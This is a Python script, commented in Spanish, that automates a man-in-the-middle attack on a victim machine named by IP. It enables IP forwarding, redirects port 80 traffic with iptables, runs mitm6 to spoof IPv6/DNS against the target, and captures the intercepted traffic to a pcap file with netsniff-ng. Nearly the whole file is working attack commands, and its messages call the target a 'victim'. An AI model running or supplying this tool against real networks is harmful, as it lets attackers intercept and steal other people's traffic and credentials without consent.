# _*_ coding: utf8 _*_
import os
import sys
import time
import argparse
#Librerias para el servidor (Beta)
import socket
import http.server
import socketserver
W = '\033[37m'
R = '\033[0;31m'  # red
G = '\033[0;32m'  # green
O = '\033[0;33m'  # orange
B = '\033[0;34m'  # blue
P = '\033[0;35m'  # purple
C = '\033[0;36m'  # cyan
GRs = '\033[0;37m'  # gray

rules_status = "Activo"
export = "dump.pcap"
print("[ EJECUTE EL SCRIPT COMO SUPER USUARIO]")
def banner():
	print(W+"    (  )   (   )  ) ")
	print(W+"     ) (   )  (  (  ")
	print(W+"     ( )  (    ) )   ")
	print(W+"     _____________   ")
	print(W+"    <_____________>  ")
	print(W+"    |             | ___")
	print(W+"    |             |/ _ \ ")
	print(W+"    |               | | |")
	print(W+"    |               |_| |")
	print(W+" ___|             |\___/ ")
	print(W+"/    \___________/    \  ")
	print(W+"\_____________________/  ")
def banner2():
	print(W+"           .------.____      ")
	print(W+"        .-'       \ ___)     ")
	print(W+"      .-'         \\\        ")
	print(W+"   .-'        ___  \\)       ")
	print(W+".-'          /  (\  |)       "+G+"GATEWAY : "+W+parse.gateway)
	print(W+"         __  \  ( | |        ")
	print(W+"        /  \  \__'| |        ")
	print(W+"       /    \____).-'        "+G+"IP LOCAL : "+W+parse.localdomain)
	print(W+"     .'       /   |          ")
	print(W+"    /     .  /    |          ")
	print(W+"  .'     / \/     |          "+G+"PORT : "+W+parse.port)
	print(W+" /      /   \     |          ")
	print(W+"       /    /    _|_         ")
	print(W+"       \   /    /\ /\        "+G+"TARGET : "+W+parse.target)
	print(W+"        \ /    /__v__\       ")
	print(W+"         '    |       |      ")
	print(W+"              |     .#|      "+G+"RULES : "+O+rules_status)
	print(W+"              |#.  .##|      ")
	print(W+"              |#######|      ")
	print(W+"              |#######|      ")
	print(W+"                             ")



def attack():
	if rules_status == "Activo":
		print(B+"[*]"+GRs+" Configurando IP forward")
		os.system("sudo echo 1 > /proc/sys/net/ipv4/ip_forward")
		print(B+"[*]"+GRs+" Configurando tablas...")
		os.system("sudo iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080")
		print(B+"[*] "+W+"IPTABLES complete.")
		print(G+"[+] Reglas activadas...")
	else:
		print(G+"[-] Reglas desactivadas")
	time.sleep(2)
	os.system("clear")
	banner2()
	print(G+"[>] "+W+"Tomate un coffee mientras comemos trafico "+G+":)")
	print(B+"[*] "+W+"Abriendo trafico entre "+parse.target+" y "+parse.gateway)
	os.system("xterm -geometry 100x30 -e 'sudo mitm6 --ignore-nofqdn -l "+parse.localdomain+" -b "+parse.target+" -i "+parse.interface+"' | xterm -geometry 120x30 -e 'sudo netsniff-ng --in "+parse.interface+" --out "+export+"'")
	print(B+"[*] "+W+"Escuchando trafico generalizado en pcap y exportandolo como "+export)

# Argumentos
parse = argparse.ArgumentParser()
parse.add_argument("-p", "--port", help="Establecer puerto a trabajar")
parse.add_argument("-g", "--gateway", help="Establecer ip del router")
parse.add_argument("-t", "--target", help="Establecer ip de la victima")
parse.add_argument("-l", "--localdomain", help="Establecer ip local del sistema")
parse.add_argument("-i", "--interface", help="Establecer interfaz de red")
parse = parse.parse_args()

banner()

def main():
	if parse.interface:
		iface = parse.interface
		print(G+"[>] "+W+"Interfaz a trabajar : "+P+iface)
	else:
		print(R+"[-] Falta el parametro de interface")
	if parse.port:
		PORT = parse.port
		print(G+"[>] "+W+"Puerto a trabajar : "+P+PORT)
	else:
		print(R+"[-] Falta el parametro de puerto !")
	if parse.gateway:
		gateway = parse.gateway
		print(G+"[>] "+W+"Gateway (Router) : "+P+gateway)
	else:
		print(R+"[-] Falta el parametro de gateway !")
	if parse.target:
		target = parse.target
		print(G+"[>] "+W+"Target Vic : "+P+target)
	else:
		print(R+"[-] Falta el parametro de target !")
	if parse.localdomain:
		local = parse.localdomain
		print(G+"[>] "+W+"IP Local : "+P+local)
	else:
		print(R+"[-] Falta el parametro de localdomain !")
	time.sleep(3)
	attack()
if __name__ == "__main__":
	try:
		main()
	except KeyboardInterrupt:
		os.system("clear")
		banner()
		print(R+"[-] Programa terminado.")
		exit()
